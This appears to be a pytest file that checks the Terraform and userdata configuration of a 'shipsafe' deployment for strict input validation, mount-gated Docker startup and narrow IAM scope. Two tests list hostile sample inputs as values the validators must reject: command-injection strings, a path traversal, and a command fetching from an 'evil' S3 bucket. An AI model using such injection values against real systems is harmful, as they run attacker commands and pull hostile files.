import re
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SSM = (ROOT / "shipsafe/infra/main/ssm.tf").read_text(encoding="utf-8")
USERDATA = (ROOT / "shipsafe/infra/main/templates/userdata.sh.tpl").read_text(encoding="utf-8")
IAM = (ROOT / "shipsafe/infra/main/iam.tf").read_text(encoding="utf-8")
TFVARS_EXAMPLE = (ROOT / "shipsafe/infra/main/terraform.tfvars.example").read_text(encoding="utf-8")


def test_ssm_uses_environment_interpolation_without_inline_tokens():
    assert "{{ ImageRef }}" not in SSM
    assert "{{ ArtifactS3Uri }}" not in SSM
    assert "{{ ReleaseId }}" not in SSM
    assert SSM.count('interpolationType = "ENV_VAR"') == 9


def test_image_reference_contract_rejects_foreign_and_injected_values():
    account, region, repo = "123456789012", "us-east-1", "shipsafe/eventledger"
    pattern = re.compile(
        rf"^{account}\.dkr\.ecr\.{region}\.amazonaws\.com/{repo}@sha256:[0-9a-f]{{64}}$"
    )
    digest = "a" * 64
    assert pattern.fullmatch(f"{account}.dkr.ecr.{region}.amazonaws.com/{repo}@sha256:{digest}")
    invalid = (
        f"999999999999.dkr.ecr.{region}.amazonaws.com/{repo}@sha256:{digest}",
        f"{account}.dkr.ecr.eu-west-1.amazonaws.com/{repo}@sha256:{digest}",
        f"{account}.dkr.ecr.{region}.amazonaws.com/other/repo@sha256:{digest}",
        f"{account}.dkr.ecr.{region}.amazonaws.com/{repo}@sha256:{digest};id",
        "$(touch /tmp/injected)",
    )
    assert all(pattern.fullmatch(value) is None for value in invalid)


def test_artifact_reference_contract_rejects_other_locations_and_injection():
    bucket, prefix, sha = "approved-shipsafe-artifacts", "releases", "b" * 40
    pattern = re.compile(
        rf"^(s3://{bucket}/{prefix}/[0-9a-f]{{40}}/shipsafe-release\.tar\.gz)?$"
    )
    assert pattern.fullmatch(f"s3://{bucket}/{prefix}/{sha}/shipsafe-release.tar.gz")
    assert pattern.fullmatch("")
    invalid = (
        f"s3://other-bucket/{prefix}/{sha}/shipsafe-release.tar.gz",
        f"s3://{bucket}/other/{sha}/shipsafe-release.tar.gz",
        f"s3://{bucket}/{prefix}/../../secret",
        f"s3://{bucket}/{prefix}/{sha}/shipsafe-release.tar.gz;id",
        "$(aws s3 cp s3://evil/x /tmp/x)",
    )
    assert all(pattern.fullmatch(value) is None for value in invalid)


def test_docker_is_gated_on_verified_data_mount():
    disable = USERDATA.index("systemctl disable --now docker.service docker.socket")
    locate = USERDATA.index("Locating targeted EBS volume")
    start = USERDATA.index("systemctl start docker.service")
    assert disable < locate < start
    assert "RequiresMountsFor=$DATA_MOUNT" in USERDATA
    assert "ExecStartPre=/usr/bin/mountpoint -q $DATA_MOUNT" in USERDATA
    assert "ExecStartPre=/usr/bin/grep -Fxq EBS_VOLUME_ID=$TARGET_VOL_ID $CANARY_FILE" in USERDATA


def test_oidc_review_is_scoped_to_main_and_not_both_branches():
    assert 'deploy_branch      = "main"' in TFVARS_EXAMPLE
    assert '"ref:refs/heads/${var.deploy_branch}"' in IAM
    assert "refs/heads/main" not in IAM
    assert "refs/heads/feature/shipsafe" not in IAM


def test_artifact_iam_has_no_arbitrary_bucket_read():
    assert 'Resource = "arn:aws:s3:::*/*"' not in IAM
    assert '${aws_s3_bucket.release_artifacts.arn}/${var.artifact_release_prefix}/*' in IAM


def test_managed_ssm_policy_cannot_expand_runtime_parameter_scope():
    assert re.search(r'Sid\s*=\s*"DenyParameterReadsOutsideRuntime"', IAM)
    assert re.search(r'NotResource\s*=\s*\[', IAM)
    assert ':parameter/shipsafe/runtime"' in IAM


def test_publisher_can_reuse_ecr_digest_and_ssm_can_discover_log_groups():
    push = IAM.split('resource "aws_iam_policy" "ecr_push"', 1)[1].split('resource "aws_iam_policy" "ssm_deploy"', 1)[0]
    assert 'ecr:GetDownloadUrlForLayer' in push
    assert 'Resource = aws_ecr_repository.shipsafe.arn' in push
    assert 'logs:DescribeLogGroups' in IAM
